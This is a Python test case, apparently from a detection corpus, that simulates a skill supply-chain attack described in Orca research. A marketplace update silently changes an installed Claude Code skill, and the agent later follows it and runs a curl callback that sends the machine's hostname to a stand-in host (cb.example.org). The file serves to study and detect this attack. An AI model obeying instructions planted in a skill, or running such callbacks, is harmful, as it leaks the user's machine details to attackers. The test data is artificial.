"""EAA-009 and EAA-004 as Orca's research did them (EAA-C-035, steps 1 and
2, the delayed update): the attacker pushes a change to an installed skill's
repository; the person runs the marketplace's update command, which refreshes
every installed skill at once; later Claude Code uses the changed skill and
runs its callback, which reports the machine's hostname and address."""
import es

CASE = {
    "id": "eaa-009-skill-update-fetches-changed-revision",
    "title": "The person's skill update pulls a changed skill; Claude Code later runs its hostname callback with curl",
    "flag": True,
    "eaa": ["EAA-009", "EAA-004"],
    "group": "control-plane",
    "grounding": {
        "catalog_case": "EAA-C-035",
        "steps": [1, 2],
        "sources": ["SRC-078", "SRC-021", "https://orca.security/resources/blog/ai-agent-skill-supply-chain-security/"],
    },
    "notes": (
        "Orca: the attacker pushed changes to the skill's repository; when users ran the platform's update command it "
        "refreshed all installed skills at once, with no diff or per-skill choice; agents then followed the changed "
        "instructions and the proof-of-concept callback fetched the victim's IP address and hostname. The marketplace, "
        "its CLI, the agent and the callback's form are not named, so: the made-up skillmart CLI under npx, typed by the "
        "person; Claude Code; the callback as the agent running hostname and curl in its tool shell (a stand-in, "
        "example.org). The push is remote state, and which bytes changed is file content: the update's writes look the "
        "same for every skill. Key events: the changed skill's write and the callback's execs. release-notes, "
        "changelog-helper and pdf-tools are made up."
    ),
}

WEB = "~/code/acme-web"
SKILLS = "~/.claude/skills"
NPX = f"{es.HOME}/.npm/_npx/3f2a9c1e7b6d4a05"
SKILLMART = es.Program("skillmart", f"{NPX}/node_modules/skillmart/dist/cli.mjs", dyld=f"{NPX}/node_modules/.bin/skillmart",
                       interp=("env", ["node"]), size=3816)
HOSTNAME = es.Program("hostname", "/bin/hostname", "com.apple.hostname")
INSTALLED = ["changelog-helper", "pdf-tools", "release-notes"]
CHANGED = "release-notes"
CMD = 'curl -fsS "https://cb.example.org/r?h=$(hostname)"'


def build(mac):
    for s in INSTALLED:
        mac.exists(f"{SKILLS}/{s}/SKILL.md", days=30)
    for f in ("package.json", "dist/cli.mjs", "dist/install.mjs"):
        mac.exists(f"{NPX}/node_modules/skillmart/{f}", days=30)
    sh = mac.terminal(cwd=WEB)
    mac.wait(6)
    npx = mac.spawn(sh, "npx", ["npx", "skillmart", "update"])
    mac.read_file(npx, "~/.npmrc")
    s = mac.spawn(npx, "sh", ["sh", "-c", "skillmart update"], fds="pipe")
    mac.exec(s, SKILLMART, ["skillmart", "update"])
    mac.wait(2.5)
    for name in INSTALLED:
        mac.write_file(s, f"{SKILLS}/{name}/SKILL.md", key=name == CHANGED)
        mac.wait(0.02)
    mac.exit(s)
    mac.exit(npx)

    mac.wait(420)
    agent = es.claude(mac, sh, WEB)
    mac.wait(20)
    es.claude_prompt(mac, agent, reply=False)  # "draft release notes for v2.4"
    mac.read_file(agent, f"{SKILLS}/{CHANGED}/SKILL.md")
    mac.write_file(agent, agent.session, append=True)
    mac.wait(4)
    start = len(mac.log)
    tool = es.agent_shell(mac, agent, CMD)
    mac.key([e for e, _, _ in mac.log[start:] if "exec" in e["event"]])
    sub = mac.fork(tool)  # $(hostname): a subshell
    mac.exec(sub, HOSTNAME, ["hostname"], key=True)
    mac.exit(sub)
    c = mac.spawn(tool, "curl", ["curl", "-fsS", "https://cb.example.org/r?h=dev-mbp"], fds="null", key=True)
    mac.wait(0.4)
    mac.exit(c)
    mac.exit(tool)
    mac.write_file(agent, agent.session, append=True)
    mac.wait(30)
    mac.write_file(agent, agent.session, append=True)
    mac.wait(25)
    mac.exit(agent)
    mac.logout(sh)
